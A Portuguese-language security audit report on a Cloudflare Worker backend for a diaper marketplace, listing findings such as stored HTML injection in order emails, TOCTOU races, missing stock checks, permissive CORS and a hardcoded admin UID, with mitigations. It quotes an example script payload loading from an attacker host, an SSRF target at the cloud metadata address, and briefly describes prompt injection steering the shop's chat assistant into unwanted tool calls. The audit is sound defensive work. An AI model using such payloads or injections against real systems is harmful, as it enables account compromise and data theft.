# Relatório de Análise de Segurança — Backend

Este documento consolida a análise detalhada de segurança baseada na revisão do código fonte do backend (Cloudflare Worker com Hono, Drizzle ORM e D1). A análise foca em identificar erros de lógica de negócios, banco de dados sem tranca (condições de corrida), inputs sem tratamento, permissões de CORS, vulnerabilidades de IDOR e segredos/chaves expostas.

---

## 📋 Resumo Executivo das Vulnerabilidades

| Arquivo | Linha(s) | Descrição do Risco | Gravidade | Tipo de Vulnerabilidade |
| :--- | :--- | :--- | :--- | :--- |
| [`back/src/lib/notifications.ts`](file:///e:/Labdev/Projetos/fraldinha-livre/back/src/lib/notifications.ts) | 23, 29 | Concatenação de nome do produto diretamente em HTML de e-mail sem escape/sanitização. | **Alta / Crítica** | Stored HTML Injection / Stored XSS |
| [`back/wrangler.jsonc`](file:///e:/Labdev/Projetos/fraldinha-livre/back/wrangler.jsonc) | 39 | Exposição pública do UID do Administrador do Firebase em arquivo de controle de versão. | **Média** | Chaves/Credenciais Expostas (Hardcoded Secrets) |
| [`back/src/routes/products.ts`](file:///e:/Labdev/Projetos/fraldinha-livre/back/src/routes/products.ts) | 43 | Autorização baseada em comparação com variável estática de UID exposta. | **Média** | Controle de Acesso Frágil |
| [`back/src/routes/orders.ts`](file:///e:/Labdev/Projetos/fraldinha-livre/back/src/routes/orders.ts) | 123-286 | O endpoint de criação de pedidos não desconta ou valida o estoque dos produtos no banco de dados. | **Média** | Falha de Lógica de Negócios (Overselling / Inconsistência) |
| [`back/src/routes/orders.ts`](file:///e:/Labdev/Projetos/fraldinha-livre/back/src/routes/orders.ts) | 304-323 | Verificação e atualização de status de pedido realizadas em requisições separadas sem transação explícita. | **Baixa / Média** | Concorrência / TOCTOU (Time-of-Check to Time-of-Use) |
| [`back/src/lib/chat-completion.ts`](file:///e:/Labdev/Projetos/fraldinha-livre/back/src/lib/chat-completion.ts) | 55 | Recebimento de URLs de imagem multimodais arbitrárias sem restrição de protocolo ou domínio. | **Baixa / Média** | Risco de SSRF (Server-Side Request Forgery) Indireto |
| [`back/src/index.ts`](file:///e:/Labdev/Projetos/fraldinha-livre/back/src/index.ts) | 17-18 | Regra de CORS aceita qualquer porta para conexões de `localhost` em produção. | **Baixa** | Configuração Permissiva de CORS |
| [`back/src/lib/chat-completion.ts`](file:///e:/Labdev/Projetos/fraldinha-livre/back/src/lib/chat-completion.ts) | 60-84 | Parsing baseado em expressões regulares rudimentares para tool calls de IA alucinadas pelo modelo. | **Baixa** | Validação de Entrada Fraca (Robustez de IA) |

---

## 🔍 Análise Detalhada — Arquivo por Arquivo, Linha por Linha

### 1. `back/wrangler.jsonc`

#### 🔴 Linha 39: `"ADMIN_UID": "KOQclmb5eshfkufioK03ayRh6Fi2"`
* **Tipo**: Chaves Expostas / Segredos no Código.
* **Gravidade**: **Média**.
* **Descrição**: O Identificador Único (UID) do Firebase do usuário administrador está escrito em texto plano no arquivo de configuração do Worker. Este arquivo é comumente versionado no repositório Git público ou compartilhado. Expor UIDs de usuários com permissões elevadas permite que atacantes conheçam o alvo exato para tentativas de sequestro de conta ou engenharia social, além de facilitar a identificação do escopo admin se as regras de segurança do Firestore usarem esse UID específico.
* **Mitigação Recomendada**: Mover a variável `ADMIN_UID` para segredos do Cloudflare Worker (`wrangler secret put ADMIN_UID`) ou gerenciar privilégios de administração usando Custom Claims do Firebase Auth (ex: `{ admin: true }`), eliminando a necessidade de UIDs hardcoded na configuração.

---

### 2. `back/src/index.ts`

#### 🟡 Linhas 17-18: `const ALLOWED_ORIGIN = /^(https?:\/\/localhost(:\d+)?|https:\/\/([a-z0-9-]+-)?fraldinha-livre-frontend\.romariobc\.workers\.dev)$/`
* **Tipo**: Permissão do Navegador (CORS).
* **Gravidade**: **Baixa**.
* **Descrição**: A expressão regular do CORS aceita conexões de `localhost` em qualquer porta (por causa de `(:\d+)?`). Embora conveniente para o desenvolvimento local, expor esse CORS permissivo em ambiente de produção pode permitir que scripts maliciosos rodando localmente na máquina do usuário final (em qualquer porta não autorizada) façam requisições cross-origin contra a API de produção.
* **Mitigação Recomendada**: Separar as origens permitidas por ambiente. Em ambiente de produção, desabilitar ou restringir o acesso a `localhost`, ou limitar apenas a portas de desenvolvimento conhecidas (ex: `localhost:3000`, `localhost:5173`).

---

### 3. `back/src/middleware/auth.ts`
> [!NOTE]
> **Sem inconformidades encontradas neste arquivo.**
> A validação de JWT usa corretamente a biblioteca `jose` e valida o `issuer` e o `audience` contra os endpoints de JWKS do Firebase (`securetoken@system.gserviceaccount.com`). O cache das chaves públicas é mantido no escopo do módulo, o que evita ataques de negação de serviço (DoS) por sobrecarga de rede ao Google a cada requisição.

---

### 4. `back/src/routes/products.ts`

#### 🟡 Linha 43: `if (uid !== c.env.ADMIN_UID)`
* **Tipo**: Controle de Acesso Frágil.
* **Gravidade**: **Média**.
* **Descrição**: A verificação de permissão para o escopo `admin` é feita comparando o UID do token do usuário com a variável de ambiente `c.env.ADMIN_UID` (que está exposta abertamente no arquivo `wrangler.jsonc`).
* **Mitigação Recomendada**: Substituir a verificação estática por Custom Claims do Firebase Auth no token JWT (ex: extrair claims adicionais e verificar `verified.claims.admin === true`), ou manter uma tabela dedicada de privilégios de usuários no banco de dados.

#### ⚪ Linhas 124-136 (`productsPutHandler`): Fluxo de leitura e gravação fora de transação
* **Tipo**: Banco sem tranca (TOCTOU).
* **Gravidade**: **Muito Baixa (Informativo)**.
* **Descrição**: O código executa primeiro uma consulta de seleção para checar o proprietário do produto e, em seguida, executa uma instrução de atualização (`update`) sem transação explícita. Em bancos distribuídos ou de alto volume, há o risco de o produto ser deletado/modificado por outro processo entre a seleção e o update (Time-of-Check to Time-of-Use). Como o SQLite no Cloudflare D1 executa consultas sequencialmente por banco e isola conexões ativamente, o risco prático é insignificante, mas conceitualmente constitui uma falta de transação.
* **Mitigação Recomendada**: Envelopar verificações seguidas de alteração em blocos de transação explícitos quando necessário.

---

### 5. `back/src/routes/orders.ts`

#### 🟡 Geral (dentro de `ordersPostHandler`): Ausência de verificação e decremento de estoque
* **Tipo**: Falha de Lógica de Negócios / Condição de Corrida de Estoque.
* **Gravidade**: **Média**.
* **Descrição**: O backend recebe a quantidade pedida, porém o handler **não valida e nem reduz** a quantidade em estoque do produto correspondente (`products.quantity`). Se o modelo de negócios exigir controle de estoque físico das fraldas, a ausência dessa trava permite compras excessivas além da quantidade física disponível (overselling), o que pode ser explorado por bots ou compradores maliciosos comprando lotes esgotados.
* **Mitigação Recomendada**: Durante a validação das ordens, verificar se a quantidade requisitada é menor ou igual ao estoque do produto (`product.quantity`), e incluir um comando de decremento de estoque (`db.update(products).set({ quantity: sql`${products.quantity} - ${item.quantity}` }).where(...)`) atômico dentro do bloco `db.batch(...)`.

#### 🟡 Linhas 304-323 (`ordersCancelHandler`): TOCTOU no cancelamento de pedidos
* **Tipo**: Banco sem tranca / Condição de Corrida (Time-of-Check to Time-of-Use).
* **Gravidade**: **Baixa / Média**.
* **Descrição**: O código busca o pedido, verifica se o status do pedido é `aguardando` e, se sim, executa o update para `cancelado` em uma consulta separada no banco fora de uma transação do SQLite. Se duas requisições de alteração de status (ex: uma de cancelamento feita pelo usuário e uma de faturamento feita pelo painel do fornecedor) ocorrerem concorrentemente no Worker, o pedido pode ser cancelado mesmo depois de já ter sido faturado ou enviado, porque o status foi lido como "aguardando" antes do faturamento ser gravado.
* **Mitigação Recomendada**: Executar a verificação de status e a atualização dentro de uma transação explícita no Drizzle/D1 para garantir isolamento e serialização adequados.

---

### 6. `back/src/lib/notifications.ts`

#### 🔴 Linhas 23 e 29: Concatenação insegura de HTML no e-mail de notificação (Stored XSS / HTML Injection)
```typescript
23:   const itemsHtml = params.items.map((item) => `<li>${item.productName} × ${item.quantity} ${item.unit}</li>`).join('')
...
29:   html: `<p>Você recebeu um novo pedido (#${params.orderId}):</p><ul>${itemsHtml}</ul>...`
```
* **Tipo**: **Input sem Tratamento (HTML Injection via E-mail)**.
* **Gravidade**: **Alta / Crítica**.
* **Descrição**: O nome do produto (`item.productName`) é cadastrado livremente pelo fornecedor no banco de dados e enviado no corpo da ordem de compra. A função `buildOrderEmail` concatena diretamente esse nome em uma tag `<li>` dentro do HTML enviado pelo serviço Resend. Um usuário/fornecedor malicioso pode cadastrar um produto com um nome contendo payloads de HTML/JavaScript (ex: `<script src="http://attacker.com/steal.js"></script>` ou tags de redirecionamento, imagens maliciosas de rastreamento ou formulários de phishing). Quando outro usuário comprar esse produto, o e-mail de notificação enviado conterá o payload malicioso, que será renderizado/executado no cliente de e-mail do destinatário.
* **Mitigação Recomendada**: Escapar caracteres HTML especiais (`<`, `>`, `&`, `"`, `'`) do `productName` e do `orderId` antes de concatená-los no HTML do e-mail. Pode ser feito por uma função simples de escape de HTML no backend:
  ```typescript
  function escapeHTML(str: string): string {
    return str.replace(/[&<>"']/g, (m) => {
      const map: Record<string, string> = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
      };
      return map[m];
    });
  }
  ```

---

### 7. `back/src/lib/chat-completion.ts`

#### 🟡 Linha 55: `image_url: { url: message.imageUrl }`
* **Tipo**: Risco de SSRF (Server-Side Request Forgery) Indireto.
* **Gravidade**: **Baixa / Média**.
* **Descrição**: O campo `imageUrl` é recebido da requisição e repassado diretamente para a API do Workers AI da Cloudflare. Se a URL informada não for um Data URI local (base64) e sim um endereço de rede externo controlado por um atacante (ex: `http://169.254.169.254/metadata`), o executor de IA do Cloudflare pode realizar requisições HTTP internas para recuperar o recurso. Isso pode expor endpoints sensíveis de infraestrutura local dependendo de como a infraestrutura de rede da Cloudflare isola as requisições de modelos de imagem.
* **Mitigação Recomendada**: Validar que `imageUrl` é estritamente um Data URI (ex: regex casando com `^data:image\/(jpeg|png|webp);base64,`) ou restringir as conexões externas no Worker, rejeitando esquemas `http://` e `https://` externos se não forem de repositórios de imagem conhecidos.

#### 🟡 Linhas 60-84 (`extractLeakedToolCalls`): Fragilidade de parser de texto de IA com regex
* **Tipo**: Validação de Entrada Fraca.
* **Gravidade**: **Baixa**.
* **Descrição**: A regex usada para capturar tool calls alucinadas/vazadas em formato de string no texto da IA pode se comportar de maneira inesperada caso o usuário envie mensagens maliciosas no chat que induzam a IA a responder com dados formatados especificamente para disparar chamadas de ferramentas indesejadas (Prompt Injection). Como a ação de compra real exige validações adicionais no checkout backend, o risco de dano ao banco é baixo, mas pode causar falhas lógicas no assistente.
* **Mitigação Recomendada**: Reforçar as diretivas do `SYSTEM_PROMPT` para desencorajar a alucinação de tool calls textuais e garantir que qualquer tool call executada pelo parser passe por um validador de esquema de tipos robusto.

---

### 8. `back/src/routes/chat.ts`
> [!NOTE]
> **Sem inconformidades graves encontradas neste arquivo.**
> O arquivo define as ferramentas e o fluxo principal do chat. Os produtos consultados pelas tools `search_products` e `get_product` passam pelas funções em `chat-tools.ts`, que corretamente filtram apenas produtos ativos (`active = true`), evitando vazamento de dados de outros fornecedores ou produtos fora de catálogo.

---

### 9. `back/src/lib/chat-tools.ts`
> [!NOTE]
> **Sem inconformidades encontradas neste arquivo.**
> Ambas as funções `searchProducts` e `getProduct` limitam os campos retornados ao assistente de IA através da constante `SEARCH_COLUMNS` (excluindo dados sensíveis como `supplierEmail` e `supplierId` dos resultados gerais). A busca por parâmetros usa a tipagem segura e placeholders preparados pelo Drizzle ORM contra ataques de SQL Injection.
